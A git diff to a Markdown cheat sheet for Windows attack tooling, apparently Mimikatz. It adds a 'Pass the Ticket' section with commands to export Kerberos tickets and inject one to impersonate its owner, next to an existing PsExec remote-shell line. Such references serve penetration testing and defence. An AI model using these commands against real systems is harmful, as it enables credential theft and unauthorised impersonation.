@@ -68,6 +68,18 @@ description: "A tool to play with Windows security, written in C."
  > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**
  > Get a shell on the machine.
 
+## MIMIKATZ Pass the Ticket
+
+
+ > 
+ > **<font color=red>sekurlsa::tickets /export</font>**</br>
+ > Export all `.kirbi` tickets into the current directory.
+
+
+ > 
+ > **<font color=red>kerberos::ptt</font> myTicketFromSekurlsa<font color=red>.kirbi</font>**</br>
+ > Cache and impersonate the given ticket.
+
 ## MIMIKATZ Golden/Silver Ticket
 
 
